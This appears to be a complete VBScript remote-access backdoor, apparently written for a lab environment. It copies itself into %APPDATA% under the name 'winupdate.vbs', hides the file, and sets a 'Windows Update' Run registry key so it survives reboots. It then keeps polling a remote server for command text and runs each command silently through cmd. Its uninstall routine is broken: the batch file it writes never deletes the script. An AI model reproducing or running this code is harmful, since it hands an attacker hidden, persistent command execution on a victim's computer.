Option Explicit
On Error Resume Next

Const server = "http://10.0.2.2:8000/command.txt"

Set oFileSystem = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Install myself
app_data = WshShell.ExpandEnvironmentStrings("%APPDATA%")
full_install = app_data & "\winupdate.vbs"
If Not oFileSystem.FileExists(full_install) Then
	oFileSystem.CopyFile WScript.ScriptFullName, full_install
	WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update", full_install, "REG_SZ"
	
	Set rs_map = oFileSystem.GetFile(full_install)
	rs_map.Attributes = 2
End If

' Listen to a server and execute commands
done = False
Do Until done
	Set XMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
	XMLHTTP.open "GET", server, False
	XMLHTTP.send
	command = XMLHTTP.responseText
	
	If InStr(command, "EXIT") Then
		done = True
	End If
	
	If InStr(command, "REMOVE") Then
		WshShell.RegDelete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update"
		Set delete_me = oFileSystem.CreateTextFile(oFileSystem.GetSpecialFolder(2) & "\romcs.bat")
		delete_me.WriteLine("@echo off")
		delete_me.WriteLine("timeout 10")
		delete_me.Close()
		
		WshShell.Run oFileSystem.GetSpecialFolder(2) & "\romcs.bat"
		done = True
	Else
		WshShell.Run "cmd /c " & command, 0, True
	End If
	
	WScript.Sleep(15000)
Loop
